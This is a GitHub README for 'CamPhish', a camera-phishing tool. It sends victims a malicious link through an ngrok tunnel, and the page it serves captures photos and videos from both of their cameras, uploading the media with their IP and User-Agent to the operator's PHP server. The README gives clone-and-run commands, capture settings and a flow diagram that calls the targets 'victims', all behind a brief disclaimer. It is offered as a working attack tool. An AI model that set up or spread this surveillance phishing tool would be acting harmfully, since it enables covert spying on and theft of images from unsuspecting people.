# 📸 CamPhish - Camera Phishing Tool

<p align="center">
  <img src="https://github.com/user-attachments/assets/957246ed-f465-4a08-bb98-30f9f07c5870" alt="CamPhish Demo" width="600">
</p>

<p align="center">
  <strong>A professional tool to capture photos and videos from front and back cameras</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0-blue.svg" alt="Version">
  <img src="https://img.shields.io/badge/Python-3.8+-green.svg" alt="Python">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20Termux-lightgrey.svg" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License">
</p>

---

## ⚠️ Disclaimer

> **This tool is for educational and authorized testing purposes only.**
> Only use this tool on devices you own or have explicit permission to test.
> The author is not responsible for any misuse or illegal activity.

---

## 🎯 What is CamPhish?

CamPhish is a powerful camera exploitation tool that allows you to capture photos and videos from a target's **front and rear cameras** through a single malicious link.

When the victim opens the link, the page automatically:
- 📸 Takes photos from the front camera
- 🎥 Records video from the front camera
- 📸 Takes photos from the back camera  
- 🎥 Records video from the back camera

All captured media is immediately uploaded to your server and saved in the `uploads/` folder!

---

## ✨ Features

- ✅ **Dual Camera Support** - Captures from both front and rear cameras
- ✅ **Auto Upload** - Media files are automatically uploaded via PHP backend
- ✅ **Concurrent Uploads** - Handles multiple files simultaneously (up to 3 at once)
- ✅ **Customizable Settings** - Adjust photo count and video duration via `index.html`
- ✅ **Logging System** - Records all victim data (IP, User-Agent, timestamps)
- ✅ **Cross-Platform** - Works on Windows, Linux, and Termux (Android)
- ✅ **Ngrok Integration** - Creates public HTTPS links automatically
- ✅ **Token Persistence** - Saves your Ngrok token for future use

---

## 📋 Prerequisites

| Requirement | Installation |
|-------------|--------------|
| **PHP** | [Download for Windows](https://www.php.net/downloads.php)<br>`sudo apt install php` (Linux)<br>`pkg install php` (Termux) |
| **Ngrok** | [Download for Windows](https://ngrok.com/download/windows)<br>[Download for Linux](https://ngrok.com/download/linux)<br>[Termux Instructions](https://github.com/Yisus7u7/termux-ngrok) |
| **Python 3.8+** | [Download for Windows](https://www.python.org/downloads/release/python-3120/)<br>`sudo apt install python` (Linux)<br>`pkg install python` (Termux) |

---

## 🚀 Installation & Setup

### Step 1: Install Ngrok & Get Your Token

1. **Sign up** at [ngrok.com](https://ngrok.com)
2. **Get your authtoken** from your dashboard
3. **Add your token**:

```bash
ngrok config add-authtoken <your_token_here>
```

### Step 2: Clone the Repository and Run

```bash
git clone https://github.com/Mr-Spect3r/CamPhish
cd CamPhish
python main.py
```

## ⚙️ Configuration

### Customizing Camera Settings

When prompted, you can modify the `index.html` file settings:

```text
Do you want to change the settings of the 'index.html' file? (y/n): y

Front Photo Count (e.g: 3): 5
Back Photo Count (e.g: 3): 3  
Front Video Seconds (e.g: 5): 10
Back Video Seconds (e.g: 4): 6
```

Or manually edit these variables in index.html:

```javascript
let frontPhotoCount = 3;      // Number of front camera photos
let backPhotoCount = 3;       // Number of back camera photos
let frontVideoSeconds = 5;    // Front video duration (seconds)
let backVideoSeconds = 5;      // Back video duration (seconds)
```

## 📁 File Structure

```text
CamPhish/
├── main.py              # Main launcher script
├── upload.php           # PHP backend for file uploads
├── index.html           # Camera capture page (sent to victim)
├── uploads/             # Captured media storage folder
├── token.txt            # Saved Ngrok token (auto-generated)
└── upload_log.json      # Activity logs (IP, User-Agent, timestamps)
```

## How It Works

```
Victim opens link → Requests camera permissions → Captures photos/videos
         ↓                    ↓                           ↓
    Ngrok tunnel ←───── Local PHP server ←────── Uploads to uploads/
```

### Technical Flow:

1. **Python script** starts PHP server on random port (8000-8999)
2. **Ngrok** creates public HTTPS tunnel to local server
3. **Victim** opens the public URL
4. **JavaScript** requests camera access (front → back)
5. **Media captured** and sent to `upload.php` via FormData
6. **PHP saves** files to `/uploads` folder
7. **Logs recorded** with victim's IP and User-Agent

---

## 📊 Output & Logs

### Captured Media Location:

```text
uploads/
├── @MrEsfelurm_front_photo_1703123456789_1.jpg
├── @MrEsfelurm_front_video_1703123456789.webm
├── @MrEsfelurm_back_photo_1703123456790_1.jpg
└── @MrEsfelurm_back_video_1703123456790.webm
```

### Log File (upload_log.json):

```
[
  {
    "ip": "192.168.1.100",
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "frontPhotos": 3,
    "frontVideos": 1,
    "backPhotos": 3,
    "backVideos": 1,
    "timestamp": "2024-01-15 14:30:25"
  }
]
```

## 🛠️ Troubleshooting

| Issue | Solution |
|-------|----------|
| **PHP not found** | Install PHP from prerequisites section |
| **Ngrok not found** | Download ngrok and add to PATH / use portable version |
| **No URL generated** | Try using a VPN (some regions block ngrok) |
| **Camera not working** | Ensure HTTPS is used (ngrok provides this) |
| **Uploads folder empty** | Check write permissions on `uploads/` directory |

---

## 📞 Contact & Support

- **Telegram**: [@MrEsfelurm](https://t.me/MrEsfelurm) | [@esfelorm](https://t.me/esfelorm) | [@TmCroc](https://t.me/TmCroc)
- **GitHub**: [Mr-Spect3r](https://github.com/Mr-Spect3r)

## ⭐ Features at a Glance

```
┌─────────────────────────────────────────────────────┐
│                   CamPhish v1.0                     │
├─────────────────────────────────────────────────────┤
│  ✅ Front & Back Camera Capture                      │
│  ✅ Photo & Video Support                            │
│  ✅ Auto Upload via PHP                              │
│  ✅ Concurrent Upload Queue                          │
│  ✅ Customizable Media Count/Duration               │
│  ✅ Ngrok HTTPS Tunneling                            │
│  ✅ Multi-Platform (Win/Linux/Termux)               │
│  ✅ IP & User-Agent Logging                          │
│  ✅ Token Persistence                                │
│  ✅ Colorful Terminal UI                             │
└─────────────────────────────────────────────────────┘
```

## 🎯 Final Notes

- The victim must **grant camera permissions** for the attack to work
- Modern browsers may show "camera in use" indicators
- Use **HTTPS links** (ngrok provides these automatically)
- All media is stored locally on **YOUR machine**
